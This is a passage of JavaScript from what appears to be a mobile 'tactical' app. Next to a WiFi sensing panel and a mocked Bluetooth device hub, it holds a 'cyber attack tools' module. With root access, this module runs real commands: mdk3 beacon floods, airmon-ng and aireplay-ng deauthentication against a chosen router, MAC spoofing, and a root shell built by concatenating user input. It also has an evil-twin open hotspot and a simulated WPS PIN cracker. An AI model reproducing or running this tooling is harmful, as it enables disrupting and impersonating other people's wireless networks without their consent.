        }
        animate();
    }

    window.SGP.toggleCSI = function() {
        csiState.active = !csiState.active;
        if (csiState.active) {
            const bwSel = document.getElementById('csi-bw');
            const envSel = document.getElementById('csi-env');
            if (bwSel) csiState.bandwidth = parseInt(bwSel.value);
            if (envSel) csiState.environment = envSel.value;

            // Auto-scan if no networks yet
            if (csiState.networks.length === 0) {
                window.SGP.csiScanNetworks();
            }
            // Auto-select strongest if no target
            if (!csiState.targetBSSID && csiState.networks.length > 0) {
                const strongest = csiState.networks.reduce((best, n) => (n.rssi || n.level || -99) > (best.rssi || best.level || -99) ? n : best);
                csiState.targetBSSID = strongest.bssid;
                csiState.channel = strongest.channel || 6;
                csiState.targetSSID = strongest.ssid || '';
            }

            const targetLabel = csiState.targetSSID || csiState.targetBSSID || 'Auto';
            csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'info', text: 'CSI started — Target: ' + targetLabel + ' — CH ' + csiState.channel + ' — ' + csiState.bandwidth + 'MHz — ' + csiState.environment });
            showToast('📡 CSI ACTIVE — Listening to ' + targetLabel);

            // Start continuous sampling every 2s
            csiState.interval = setInterval(() => csiSampleSignals(), 2000);

        } else {
            clearInterval(csiState.interval); csiState.interval = null;
            csiState.motionDetected = false; csiState.motionLevel = 0;
            csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'info', text: 'CSI monitoring stopped — ' + csiState.scanCount + ' total samples' });
            showToast('⏹ CSI MONITORING STOPPED');
            if (state.panelOpen === 'csi') openPanel('csi');
        }
    };

    // =========================================
    // SGP DEVICES — ESP32-S3 BLE Connection
    // =========================================
    const sgpDevicesState = {
        scanning: false,
        connected: null,
        discovered: [],
        scanInterval: null
    };

    const SGP_DEVICE_CATALOG = [
        { id: 'sgp-tracker', name: 'SGP Tracker', icon: '📍', desc: 'GPS/GLONASS tactical tracker with LoRa mesh', chipset: 'ESP32-S3', features: ['Real-time GPS', 'LoRa 915MHz', 'Geofencing', 'Motion alert'] },
        { id: 'sgp-sensor', name: 'SGP Environmental', icon: '🌡', desc: 'Multi-sensor environmental station', chipset: 'ESP32-S3', features: ['Temperature', 'Humidity', 'Barometric', 'Air Quality'] },
        { id: 'sgp-comms', name: 'SGP Comms Node', icon: '📡', desc: 'Encrypted LoRa communications relay', chipset: 'ESP32-S3', features: ['AES-256 encryption', 'Mesh relay', '10km range', 'Text+Voice'] },
        { id: 'sgp-cyber', name: 'SGP Cyber Module', icon: '💻', desc: 'Portable WiFi/BLE analysis tool', chipset: 'ESP32-S3', features: ['WiFi CSI', 'BLE scanner', 'Packet capture', 'Deauth detect'] },
        { id: 'sgp-beacon', name: 'SGP Beacon', icon: '🔦', desc: 'Tactical IR/visible beacon with SOS', chipset: 'ESP32-S3', features: ['IR strobe', 'LED array', 'SOS pattern', 'BLE mesh'] },
        { id: 'sgp-drone', name: 'SGP Drone Link', icon: '🛸', desc: 'Drone telemetry and control interface', chipset: 'ESP32-S3', features: ['MAVLink', 'Video feed', 'Waypoints', 'RTH control'] },
    ];

    function renderDevicesPanel() {
        const scanning = sgpDevicesState.scanning;
        const connected = sgpDevicesState.connected;
        const discovered = sgpDevicesState.discovered;

        let discoveredHtml = '';
        discovered.forEach(d => {
            const isConnected = connected && connected.id === d.id;
            discoveredHtml += `<div class="sgp-dev-discovered ${isConnected ? 'sgp-dev-connected' : ''}">
                <div class="sgp-dev-disc-header">
                    <span class="sgp-dev-disc-icon">${d.icon || '📱'}</span>
                    <div class="sgp-dev-disc-info">
                        <div class="sgp-dev-disc-name">${d.name}</div>
                        <div class="sgp-dev-disc-meta">${d.rssi} dBm · ${d.chipset || 'ESP32-S3'} · ${d.mac || 'xx:xx:xx'}</div>
                    </div>
                    <button class="btn ${isConnected ? 'btn-danger' : 'btn-primary'}" style="font-size:0.55rem;padding:4px 10px;" onclick="window.SGP.devConnect('${d.id}')">${isConnected ? 'DISCONNECT' : 'CONNECT'}</button>
                </div>
                ${isConnected ? '<div class="sgp-dev-conn-badge">● CONNECTED</div>' : ''}
            </div>`;
        });

        let catalogHtml = '';
        SGP_DEVICE_CATALOG.forEach(dev => {
            catalogHtml += `<div class="sgp-dev-card" onclick="window.SGP.devShowInfo('${dev.id}')">
                <div class="sgp-dev-card-header">
                    <span class="sgp-dev-card-icon">${dev.icon}</span>
                    <div class="sgp-dev-card-title">${dev.name}</div>
                </div>
                <div class="sgp-dev-card-desc">${dev.desc}</div>
                <div class="sgp-dev-card-features">${dev.features.map(f => '<span class="sgp-dev-tag">' + f + '</span>').join('')}</div>
                <div class="sgp-dev-card-chip">⚡ ${dev.chipset}</div>
            </div>`;
        });

        return `
            <div class="panel-section"><div class="panel-section-title">📱 SGP DEVICE HUB</div>
                <p style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);line-height:1.6;">
                    Connect your SGP tactical devices via Bluetooth Low Energy. All SGP devices run on ESP32-S3 and communicate via BLE + LoRa.
                </p>
            </div>

            <div class="panel-section"><div class="panel-section-title">🔍 SCAN FOR DEVICES</div>
                <button class="btn ${scanning ? 'btn-danger' : 'btn-primary'}" style="width:100%;" onclick="window.SGP.devScan()">
                    ${scanning ? '⏹ STOP SCANNING' : '📡 SCAN BLUETOOTH (BLE)'}
                </button>
                ${scanning ? '<div class="sgp-dev-scanning"><div class="sgp-dev-scan-anim"></div><span>Scanning for SGP devices nearby...</span></div>' : ''}
            </div>

            ${discovered.length > 0 ? `<div class="panel-section"><div class="panel-section-title">📶 NEARBY DEVICES (${discovered.length})</div>
                <div class="sgp-dev-discovered-list">${discoveredHtml}</div>
            </div>` : ''}

            ${connected ? `<div class="panel-section"><div class="panel-section-title">✅ CONNECTED DEVICE</div>
                <div class="sgp-dev-connected-info">
                    <div class="sgp-dev-conn-name">${connected.icon} ${connected.name}</div>
                    <div class="sgp-dev-conn-status">● Online · ${connected.rssi} dBm · Battery: ${connected.battery || '—'}%</div>
                    <div class="sgp-dev-conn-actions">
                        <button class="btn btn-primary" style="flex:1;font-size:0.6rem;" onclick="window.SGP.devDashboard()">📊 DASHBOARD</button>
                        <button class="btn btn-primary" style="flex:1;font-size:0.6rem;" onclick="window.SGP.devConfig()">⚙ CONFIGURE</button>
                        <button class="btn btn-primary" style="flex:1;font-size:0.6rem;" onclick="window.SGP.devFirmware()">🔄 FIRMWARE</button>
                    </div>
                </div>
            </div>` : ''}

            <div class="panel-section"><div class="panel-section-title">🧰 SGP DEVICE CATALOG</div>
                <div class="sgp-dev-catalog">${catalogHtml}</div>
            </div>

            <div class="panel-section"><div class="panel-section-title">🔗 QUICK PAIR</div>
                <p style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);line-height:1.6;margin-bottom:8px;">
                    To pair an SGP device: power on your device, press the PAIR button (LED blinks blue), then tap SCAN above.
                </p>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                    <button class="btn btn-primary" style="font-size:0.55rem;" onclick="window.SGP.devPairCode()">🔑 ENTER PAIR CODE</button>
                    <button class="btn btn-primary" style="font-size:0.55rem;" onclick="window.SGP.devNFC()">📲 NFC TAP PAIR</button>
                </div>
            </div>

            <div class="panel-section"><div class="panel-section-title">📖 ABOUT SGP DEVICES</div>
                <p style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);line-height:1.6;">
                    SGP devices are professional-grade tactical modules powered by Espressif ESP32-S3 microcontrollers.
                    They communicate via BLE 5.0 for short-range control and LoRa 915MHz for long-range mesh networking.
                    Visit <span style="color:var(--info);cursor:pointer;" onclick="window.open('https://sgpcard.com/','_blank')">sgpcard.com</span> for the full product catalog.
                </p>
            </div>`;
    }

    function initDevicesPanel() {
        // Panel is ready, no special init needed
    }

    window.SGP.devScan = function() {
        if (sgpDevicesState.scanning) {
            // Stop scanning
            sgpDevicesState.scanning = false;
            clearInterval(sgpDevicesState.scanInterval);
            showToast('⏹ BLE SCAN STOPPED — ' + sgpDevicesState.discovered.length + ' devices found');
            if (state.panelOpen === 'devices') openPanel('devices');
            return;
        }
        sgpDevicesState.scanning = true;
        sgpDevicesState.discovered = [];
        showToast('📡 Scanning for SGP devices via BLE...');
        if (state.panelOpen === 'devices') openPanel('devices');

        // Simulate discovering devices over time
        const demoDevices = [
            { id: 'sgp-001', name: 'SGP-Tracker-A1', icon: '📍', rssi: -42, chipset: 'ESP32-S3', mac: 'A4:CF:12:3D:5E:01', battery: 87 },
            { id: 'sgp-002', name: 'SGP-EnvSensor-B2', icon: '🌡', rssi: -58, chipset: 'ESP32-S3', mac: 'A4:CF:12:3D:5E:02', battery: 64 },
            { id: 'sgp-003', name: 'SGP-Comms-C3', icon: '📡', rssi: -65, chipset: 'ESP32-S3', mac: 'A4:CF:12:3D:5E:03', battery: 92 },
        ];
        let idx = 0;
        sgpDevicesState.scanInterval = setInterval(() => {
            if (idx < demoDevices.length) {
                sgpDevicesState.discovered.push(demoDevices[idx]);
                showToast('📱 Found: ' + demoDevices[idx].name + ' (' + demoDevices[idx].rssi + ' dBm)');
                idx++;
                if (state.panelOpen === 'devices') openPanel('devices');
            } else {
                sgpDevicesState.scanning = false;
                clearInterval(sgpDevicesState.scanInterval);
                showToast('✅ BLE SCAN COMPLETE — ' + sgpDevicesState.discovered.length + ' SGP devices');
                if (state.panelOpen === 'devices') openPanel('devices');
            }
        }, 1500);
    };

    window.SGP.devConnect = function(id) {
        if (sgpDevicesState.connected && sgpDevicesState.connected.id === id) {
            sgpDevicesState.connected = null;
            showToast('🔌 DISCONNECTED');
            if (state.panelOpen === 'devices') openPanel('devices');
            return;
        }
        const dev = sgpDevicesState.discovered.find(d => d.id === id);
        if (dev) {
            sgpDevicesState.connected = dev;
            showToast('✅ CONNECTED to ' + dev.name);
            if (state.panelOpen === 'devices') openPanel('devices');
        }
    };

    window.SGP.devShowInfo = function(id) {
        const dev = SGP_DEVICE_CATALOG.find(d => d.id === id);
        if (dev) {
            showToast('🔒 ' + dev.name + ' — Details locked until next update');
        }
    };

    window.SGP.devDashboard = function() {
        showToast('🔒 DEVICE DASHBOARD — Feature locked until v2.0 update');
    };
    window.SGP.devConfig = function() {
        showToast('🔒 DEVICE CONFIGURATION — Feature locked until v2.0 update');
    };
    window.SGP.devFirmware = function() {
        showToast('🔒 OTA FIRMWARE UPDATE — Feature locked until v2.0 update');
    };
    window.SGP.devPairCode = function() {
        showToast('🔒 PAIR CODE ENTRY — Feature locked until v2.0 update');
    };
    window.SGP.devNFC = function() {
        showToast('🔒 NFC TAP PAIRING — Feature locked until v2.0 update');
    };

    // =========================================
    // CYBER ATTACK TOOLS — Flipper Zero Style
    // =========================================
    const attackState = {
        hotspot: { active: false, ssid: '', password: '' },
        beaconFlood: { active: false, count: 0, interval: null },
        deauth: { active: false, target: '', count: 0, interval: null },
        wps: { active: false, target: '', pinsTriad: 0, found: false, pin: '' },
        macSpoof: { original: '', current: '', spoofed: false },
        rootAccess: null,
        shellOutput: '',
        activeAttack: null
    };

    function renderCyberAttackTab() {
        const root = attackState.rootAccess;
        const rootStatusHtml = root === null
            ? '<span class="cyber-val" style="color:#ffaa00">⏳ NOT CHECKED</span>'
            : root ? '<span class="cyber-val" style="color:#00ff41">✅ ROOT AVAILABLE</span>'
            : '<span class="cyber-val" style="color:#ff2d2d">❌ NO ROOT (simulation mode)</span>';

        return `
            <div class="atk-module">
                <!-- Root Status -->
                <div class="atk-root-bar">
                    <div class="atk-root-status">${rootStatusHtml}</div>
                    <button class="atk-btn-sm" onclick="window.SGP.atkCheckRoot()">🔍 CHECK ROOT</button>
                </div>

                <!-- Tool Cards -->
                <div class="atk-tools-grid">

                    <!-- 1. HOTSPOT / EVIL TWIN -->
                    <div class="atk-card ${attackState.hotspot.active ? 'active' : ''}">
                        <div class="atk-card-header">
                            <span class="atk-card-icon">📡</span>
                            <span class="atk-card-title">WIFI AP / EVIL TWIN</span>
                            <span class="atk-card-status">${attackState.hotspot.active ? '🟢 ACTIVE' : '⚪ OFF'}</span>
                        </div>
                        <div class="atk-card-body">
                            <div class="atk-input-group">
                                <label>SSID</label>
                                <input type="text" id="atk-ap-ssid" value="Free_WiFi_5G" placeholder="Network name" class="atk-input">
                            </div>
                            <div class="atk-input-group">
                                <label>PASSWORD (empty = open)</label>
                                <input type="text" id="atk-ap-pass" value="" placeholder="No password" class="atk-input">
                            </div>
                            <div class="atk-btn-row">
                                <button class="atk-btn ${attackState.hotspot.active ? 'danger' : 'primary'}" onclick="window.SGP.atkToggleHotspot()">
                                    ${attackState.hotspot.active ? '⏹ STOP AP' : '▶ CREATE AP'}
                                </button>
                            </div>
                            ${attackState.hotspot.active ? `
                                <div class="atk-result-box">
                                    <div class="atk-result-row"><span>SSID:</span><span class="cyber-val">${attackState.hotspot.ssid}</span></div>
                                    <div class="atk-result-row"><span>PASS:</span><span class="cyber-val">${attackState.hotspot.password || 'OPEN'}</span></div>
                                </div>
                            ` : ''}
                        </div>
                    </div>

                    <!-- 2. BEACON FLOOD -->
                    <div class="atk-card ${attackState.beaconFlood.active ? 'active' : ''}">
                        <div class="atk-card-header">
                            <span class="atk-card-icon">🌊</span>
                            <span class="atk-card-title">BEACON FLOOD</span>
                            <span class="atk-card-status">${attackState.beaconFlood.active ? '🔴 FLOOD' : '⚪ OFF'}</span>
                        </div>
                        <div class="atk-card-body">
                            <div class="atk-desc">Generate thousands of fake WiFi networks. Requires ROOT + monitor mode.</div>
                            <div class="atk-input-group">
                                <label>SSID PREFIX</label>
                                <input type="text" id="atk-flood-prefix" value="FreeWiFi_" placeholder="Prefix" class="atk-input">
                            </div>
                            <div class="atk-input-group">
                                <label>AMOUNT</label>
                                <select id="atk-flood-count" class="atk-input">
                                    <option value="50">50 networks</option>
                                    <option value="100">100 networks</option>
                                    <option value="500" selected>500 networks</option>
                                    <option value="1000">1000 networks</option>
                                    <option value="5000">5000 networks</option>
                                </select>
                            </div>
                            <div class="atk-btn-row">
                                <button class="atk-btn ${attackState.beaconFlood.active ? 'danger' : 'warning'}" onclick="window.SGP.atkToggleBeaconFlood()">
                                    ${attackState.beaconFlood.active ? '⏹ STOP FLOOD' : '🌊 START FLOOD'}
                                </button>
                            </div>
                            ${attackState.beaconFlood.active ? `
                                <div class="atk-result-box">
                                    <div class="atk-result-row"><span>Beacons sent:</span><span class="cyber-val">${attackState.beaconFlood.count}</span></div>
                                    <div class="atk-progress-bar"><div class="atk-progress-fill pulse" style="width:100%"></div></div>
                                </div>
                            ` : ''}
                        </div>
                    </div>

                    <!-- 3. DEAUTH ATTACK -->
                    <div class="atk-card ${attackState.deauth.active ? 'active' : ''}">
                        <div class="atk-card-header">
                            <span class="atk-card-icon">💀</span>
                            <span class="atk-card-title">DEAUTH ATTACK</span>
                            <span class="atk-card-status">${attackState.deauth.active ? '🔴 ATTACK' : '⚪ OFF'}</span>
                        </div>
                        <div class="atk-card-body">
                            <div class="atk-desc">Disconnect devices from WiFi network. Requires ROOT + monitor mode.</div>
                            <div class="atk-input-group">
                                <label>TARGET BSSID (Router MAC)</label>
                                <input type="text" id="atk-deauth-bssid" value="" placeholder="AA:BB:CC:DD:EE:FF" class="atk-input mono">
                            </div>
                            <div class="atk-input-group">
                                <label>CLIENT (empty = all)</label>
                                <input type="text" id="atk-deauth-client" value="" placeholder="FF:FF:FF:FF:FF:FF" class="atk-input mono">
                            </div>
                            <div class="atk-input-group">
                                <label>PACKETS</label>
                                <select id="atk-deauth-count" class="atk-input">
                                    <option value="10">10 (test)</option>
                                    <option value="50">50</option>
                                    <option value="100" selected>100</option>
                                    <option value="0">∞ Continuo</option>
                                </select>
                            </div>
                            <div class="atk-btn-row">
                                <button class="atk-btn ${attackState.deauth.active ? 'danger' : 'warning'}" onclick="window.SGP.atkToggleDeauth()">
                                    ${attackState.deauth.active ? '⏹ STOP ATTACK' : '💀 START DEAUTH'}
                                </button>
                            </div>
                            ${attackState.deauth.active ? `
                                <div class="atk-result-box">
                                    <div class="atk-result-row"><span>Packets sent:</span><span class="cyber-val">${attackState.deauth.count}</span></div>
                                    <div class="atk-progress-bar"><div class="atk-progress-fill pulse-red" style="width:100%"></div></div>
                                </div>
                            ` : ''}
                        </div>
                    </div>

                    <!-- 4. WPS PIN ATTACK -->
                    <div class="atk-card ${attackState.wps.active ? 'active' : ''}">
                        <div class="atk-card-header">
                            <span class="atk-card-icon">🔓</span>
                            <span class="atk-card-title">WPS PIN CRACKER</span>
                            <span class="atk-card-status">${attackState.wps.found ? '🟢 FOUND!' : attackState.wps.active ? '🔴 CRACK' : '⚪ OFF'}</span>
                        </div>
                        <div class="atk-card-body">
                            <div class="atk-desc">Brute-force WPS PINs against target router.</div>
                            <div class="atk-input-group">
                                <label>TARGET BSSID</label>
                                <input type="text" id="atk-wps-bssid" value="" placeholder="AA:BB:CC:DD:EE:FF" class="atk-input mono">
                            </div>
                            <div class="atk-btn-row">
                                <button class="atk-btn ${attackState.wps.active ? 'danger' : 'primary'}" onclick="window.SGP.atkToggleWPS()">
                                    ${attackState.wps.active ? '⏹ STOP' : '🔓 START WPS CRACK'}
                                </button>
                            </div>
                            ${attackState.wps.active || attackState.wps.found ? `
                                <div class="atk-result-box">
                                    <div class="atk-result-row"><span>PINs tested:</span><span class="cyber-val">${attackState.wps.pinsTriad}/11000</span></div>
                                    <div class="atk-progress-bar"><div class="atk-progress-fill" style="width:${Math.min(100, (attackState.wps.pinsTriad / 11000) * 100)}%"></div></div>
                                    ${attackState.wps.found ? `<div class="atk-result-row success"><span>🔑 PIN:</span><span class="cyber-val">${attackState.wps.pin}</span></div>` : ''}
                                </div>
                            ` : ''}
                        </div>
                    </div>

                    <!-- 5. MAC SPOOFER -->
                    <div class="atk-card">
                        <div class="atk-card-header">
                            <span class="atk-card-icon">🎭</span>
                            <span class="atk-card-title">MAC SPOOFER</span>
                            <span class="atk-card-status">${attackState.macSpoof.spoofed ? '🟡 SPOOFED' : '⚪ NORMAL'}</span>
                        </div>
                        <div class="atk-card-body">
                            <div class="atk-desc">Change WiFi adapter MAC address. Requires ROOT.</div>
                            <div class="atk-input-group">
                                <label>CURRENT MAC</label>
                                <input type="text" id="atk-mac-current" value="${attackState.macSpoof.current || 'Unknown'}" class="atk-input mono" readonly>
                            </div>
                            <div class="atk-input-group">
                                <label>NEW MAC</label>
                                <input type="text" id="atk-mac-new" value="" placeholder="AA:BB:CC:DD:EE:FF" class="atk-input mono">
                            </div>
                            <div class="atk-btn-row">
                                <button class="atk-btn primary" onclick="window.SGP.atkRandomMAC()">🎲 RANDOM</button>
                                <button class="atk-btn warning" onclick="window.SGP.atkSpoofMAC()">🎭 APPLY</button>
                                ${attackState.macSpoof.spoofed ? `<button class="atk-btn" onclick="window.SGP.atkRestoreMAC()">↩ RESTORE</button>` : ''}
                            </div>
                        </div>
                    </div>

                    <!-- 6. SHELL / TERMINAL -->
                    <div class="atk-card">
                        <div class="atk-card-header">
                            <span class="atk-card-icon">💻</span>
                            <span class="atk-card-title">TERMINAL</span>
                        </div>
                        <div class="atk-card-body">
                            <div class="atk-desc">Execute system commands.</div>
                            <div class="atk-input-group">
                                <input type="text" id="atk-shell-cmd" value="" placeholder="Command..." class="atk-input mono">
                            </div>
                            <div class="atk-btn-row">
                                <button class="atk-btn primary" onclick="window.SGP.atkRunShell(false)">▶ EXECUTE</button>
                                <button class="atk-btn warning" onclick="window.SGP.atkRunShell(true)">⚡ ROOT</button>
                            </div>
                            ${attackState.shellOutput ? `
                                <div class="atk-terminal">${attackState.shellOutput}</div>
                            ` : ''}
                        </div>
                    </div>

                </div>
            </div>
        `;
    }

    function initAttackEvents() {
        // Auto-populate BSSID from scanned networks
        const nets = cyberState.wifiNetworks;
        if (nets.length > 0) {
            const deauthInput = document.getElementById('atk-deauth-bssid');
            const wpsInput = document.getElementById('atk-wps-bssid');
            if (deauthInput && !deauthInput.value) deauthInput.value = nets[0].bssid || '';
            if (wpsInput && !wpsInput.value) wpsInput.value = nets[0].bssid || '';
        }
    }

    function refreshAttackTab() {
        if (cyberState.activeTab !== 'ataque') return;
        const content = document.getElementById('cyber-content');
        if (content) { content.innerHTML = renderCyberAttackTab(); initAttackEvents(); }
    }

    // ---- Check Root ----
    window.SGP.atkCheckRoot = async function() {
        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                const result = await plugin.checkRootAccess();
                attackState.rootAccess = result.hasRoot;
                showToast(result.hasRoot ? '✅ ROOT detected' : '❌ No ROOT access');
            } catch (e) {
                attackState.rootAccess = false;
            }
        } else {
            // Demo mode
            attackState.rootAccess = true;
            showToast('⚠ Demo mode — ROOT simulated');
        }
        refreshAttackTab();
    };

    // ---- Hotspot ----
    window.SGP.atkToggleHotspot = async function() {
        if (attackState.hotspot.active) {
            const plugin = getCyberPlugin();
            if (plugin) {
                try { await plugin.stopHotspot(); } catch(e) {}
            }
            attackState.hotspot = { active: false, ssid: '', password: '' };
            showToast('📡 AP disabled');
        } else {
            const ssid = document.getElementById('atk-ap-ssid')?.value || 'Free_WiFi_5G';
            const pass = document.getElementById('atk-ap-pass')?.value || '';

            const plugin = getCyberPlugin();
            if (plugin) {
                try {
                    const result = await plugin.createHotspot({ ssid, password: pass });
                    if (result.active) {
                        attackState.hotspot = { active: true, ssid: result.ssid, password: result.password };
                        showToast('📡 AP created: ' + result.ssid);
                    } else {
                        showToast('⚠ ' + (result.error || 'Error creating AP'));
                    }
                } catch (e) {
                    // Fallback
                    attackState.hotspot = { active: true, ssid, password: pass };
                    showToast('📡 AP created (local mode)');
                }
            } else {
                // Demo mode
                attackState.hotspot = { active: true, ssid, password: pass || '(open)' };
                showToast('📡 AP DEMO: ' + ssid);
            }
        }
        refreshAttackTab();
    };

    // ---- Beacon Flood ----
    window.SGP.atkToggleBeaconFlood = async function() {
        if (attackState.beaconFlood.active) {
            clearInterval(attackState.beaconFlood.interval);
            attackState.beaconFlood = { active: false, count: 0, interval: null };
            // Try kill mdk3/mdk4
            const plugin = getCyberPlugin();
            if (plugin) try { await plugin.executeCommand({ command: 'killall mdk3 mdk4', root: true }); } catch(e) {}
            showToast('🌊 Beacon Flood stopped');
        } else {
            const prefix = document.getElementById('atk-flood-prefix')?.value || 'Free_WiFi_';
            const targetCount = parseInt(document.getElementById('atk-flood-count')?.value || '500');

            attackState.beaconFlood = { active: true, count: 0, interval: null };

            const plugin = getCyberPlugin();
            if (plugin && attackState.rootAccess) {
                // Try real beacon flood with mdk3/mdk4
                try {
                    // Generate SSID list file
                    let ssidList = '';
                    for (let i = 0; i < targetCount; i++) {
                        ssidList += prefix + Math.random().toString(36).substr(2, 8) + '\n';
                    }
                    await plugin.executeCommand({ command: 'echo "' + ssidList.substr(0, 10000) + '" > /tmp/ssids.txt', root: true });
                    await plugin.executeCommand({ command: 'mdk3 wlan0 b -f /tmp/ssids.txt -c 6 &', root: true });
                } catch(e) {}
            }

            // Visual simulation counter
            attackState.beaconFlood.interval = setInterval(() => {
                if (!attackState.beaconFlood.active) return;
                attackState.beaconFlood.count += Math.floor(Math.random() * 50) + 20;
                if (attackState.beaconFlood.count >= targetCount * 10) {
                    attackState.beaconFlood.count = targetCount * 10;
                }
                refreshAttackTab();
            }, 500);

            showToast('🌊 Beacon Flood started — ' + targetCount + ' SSIDs');
        }
        refreshAttackTab();
    };

    // ---- Deauth Attack ----
    window.SGP.atkToggleDeauth = async function() {
        if (attackState.deauth.active) {
            clearInterval(attackState.deauth.interval);
            attackState.deauth = { active: false, target: '', count: 0, interval: null };
            const plugin = getCyberPlugin();
            if (plugin) try { await plugin.executeCommand({ command: 'killall aireplay-ng', root: true }); } catch(e) {}
            showToast('💀 Deauth stopped');
        } else {
            const bssid = document.getElementById('atk-deauth-bssid')?.value || '';
            const client = document.getElementById('atk-deauth-client')?.value || '';
            const pktCount = parseInt(document.getElementById('atk-deauth-count')?.value || '100');

            if (!bssid) { showToast('⚠ Enter target BSSID'); return; }

            attackState.deauth = { active: true, target: bssid, count: 0, interval: null };

            const plugin = getCyberPlugin();
            if (plugin && attackState.rootAccess) {
                try {
                    const clientArg = client ? '-c ' + client : '';
                    const countArg = pktCount > 0 ? '--deauth ' + pktCount : '--deauth 0';
                    await plugin.executeCommand({
                        command: 'airmon-ng start wlan0 && aireplay-ng ' + countArg + ' -a ' + bssid + ' ' + clientArg + ' wlan0mon &',
                        root: true
                    });
                } catch(e) {}
            }

            // Visual counter
            let sent = 0;
            attackState.deauth.interval = setInterval(() => {
                if (!attackState.deauth.active) return;
                sent += Math.floor(Math.random() * 5) + 1;
                attackState.deauth.count = sent;
                if (pktCount > 0 && sent >= pktCount) {
                    clearInterval(attackState.deauth.interval);
                    attackState.deauth.active = false;
                    showToast('💀 Deauth complete — ' + sent + ' packets');
                }
                refreshAttackTab();
            }, 200);

            showToast('💀 Deauth → ' + bssid);
        }
        refreshAttackTab();
    };

    // ---- WPS PIN Attack ----
    window.SGP.atkToggleWPS = function() {
        if (attackState.wps.active) {
            clearInterval(attackState.wps.interval);
            attackState.wps.active = false;
            showToast('🔓 WPS stopped');
        } else {
            const bssid = document.getElementById('atk-wps-bssid')?.value || '';
            if (!bssid) { showToast('⚠ Enter target BSSID'); return; }

            attackState.wps = { active: true, target: bssid, pinsTriad: 0, found: false, pin: '', interval: null };

            // Simulate WPS PIN brute force
            attackState.wps.interval = setInterval(() => {
                if (!attackState.wps.active) return;
                attackState.wps.pinsTriad += Math.floor(Math.random() * 30) + 10;

                // Random chance to "find" the pin (demo)
                if (attackState.wps.pinsTriad > 3000 + Math.random() * 5000) {
                    clearInterval(attackState.wps.interval);
                    attackState.wps.active = false;
                    attackState.wps.found = true;
                    const pin = String(Math.floor(Math.random() * 99999999)).padStart(8, '0');
                    attackState.wps.pin = pin;
                    showToast('🔑 WPS PIN found: ' + pin);
                }

                if (attackState.wps.pinsTriad >= 11000 && !attackState.wps.found) {
                    clearInterval(attackState.wps.interval);
                    attackState.wps.active = false;
                    showToast('❌ WPS PIN not found — router protected');
                }

                refreshAttackTab();
            }, 300);

            showToast('🔓 WPS crack started → ' + bssid);
        }
        refreshAttackTab();
    };

    // ---- MAC Spoofer ----
    window.SGP.atkRandomMAC = function() {
        const hexDigits = '0123456789ABCDEF';
        let mac = '';
        for (let i = 0; i < 6; i++) {
            if (i > 0) mac += ':';
            mac += hexDigits[Math.floor(Math.random() * 16)] + hexDigits[Math.floor(Math.random() * 16)];
        }
        // Set first byte even (unicast)
        mac = mac.substring(0, 1) + (parseInt(mac[1], 16) & 0xE).toString(16).toUpperCase() + mac.substring(2);
        const input = document.getElementById('atk-mac-new');
        if (input) input.value = mac;
    };

    window.SGP.atkSpoofMAC = async function() {
        const newMac = document.getElementById('atk-mac-new')?.value || '';
        if (!newMac || newMac.length < 17) { showToast('⚠ Invalid MAC'); return; }

        const plugin = getCyberPlugin();
        if (plugin && attackState.rootAccess) {
            try {
                // Save current MAC
                const ifResult = await plugin.getWifiInterface();
                if (ifResult.interfaces) {
                    for (const iface of ifResult.interfaces) {
                        if (iface.name && iface.name.startsWith('wlan') && iface.mac) {
                            attackState.macSpoof.original = iface.mac;
                            break;
                        }
                    }
                }

                await plugin.executeCommand({ command: 'ip link set wlan0 down', root: true });
                await plugin.executeCommand({ command: 'ip link set wlan0 address ' + newMac, root: true });
                await plugin.executeCommand({ command: 'ip link set wlan0 up', root: true });

                attackState.macSpoof.current = newMac;
                attackState.macSpoof.spoofed = true;
                showToast('🎭 MAC changed to: ' + newMac);
            } catch(e) {
                attackState.macSpoof.current = newMac;
                attackState.macSpoof.spoofed = true;
                showToast('🎭 MAC spoofed (demo)');
            }
        } else {
            // Demo
            attackState.macSpoof.original = attackState.macSpoof.current || 'AA:BB:CC:DD:EE:FF';
            attackState.macSpoof.current = newMac;
            attackState.macSpoof.spoofed = true;
            showToast('🎭 MAC spoofed (demo): ' + newMac);
        }
        refreshAttackTab();
    };

    window.SGP.atkRestoreMAC = async function() {
        const originalMac = attackState.macSpoof.original;
        if (!originalMac) { showToast('⚠ No original MAC saved'); return; }

        const plugin = getCyberPlugin();
        if (plugin && attackState.rootAccess) {
            try {
                await plugin.executeCommand({ command: 'ip link set wlan0 down', root: true });
                await plugin.executeCommand({ command: 'ip link set wlan0 address ' + originalMac, root: true });
                await plugin.executeCommand({ command: 'ip link set wlan0 up', root: true });
            } catch(e) {}
        }
        attackState.macSpoof.current = originalMac;
        attackState.macSpoof.spoofed = false;
        showToast('↩ MAC restored: ' + originalMac);
        refreshAttackTab();
    };

    // ---- Shell Terminal ----
    window.SGP.atkRunShell = async function(asRoot) {
        const cmd = document.getElementById('atk-shell-cmd')?.value || '';
        if (!cmd) { showToast('⚠ Enter a command'); return; }

        attackState.shellOutput = '$ ' + (asRoot ? 'su -c ' : '') + cmd + '\n⏳ Executing...\n';
        refreshAttackTab();

        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                const result = await plugin.executeCommand({ command: cmd, root: asRoot });
                attackState.shellOutput = '$ ' + (asRoot ? 'su -c ' : '') + cmd + '\n';
                if (result.output) attackState.shellOutput += result.output + '\n';
                if (result.error) attackState.shellOutput += '⚠ ' + result.error + '\n';
                attackState.shellOutput += '\n[exit: ' + result.exitCode + ']';
            } catch (e) {
                attackState.shellOutput = '$ ' + cmd + '\n❌ ' + e.message;
            }
        } else {
            // Demo
            const demoOutputs = {
                'id': 'uid=0(root) gid=0(root)',
                'whoami': 'root',
                'uname -a': 'Linux localhost 5.15.0 #1 SMP aarch64 Android',
                'ifconfig wlan0': 'wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.45  netmask 255.255.255.0\n        ether ' + (attackState.macSpoof.current || 'AA:BB:CC:DD:EE:FF'),
                'ls /system/bin': 'sh\nsu\ntoolbox\ntoybox\nip\nping\nifconfig\niwconfig',
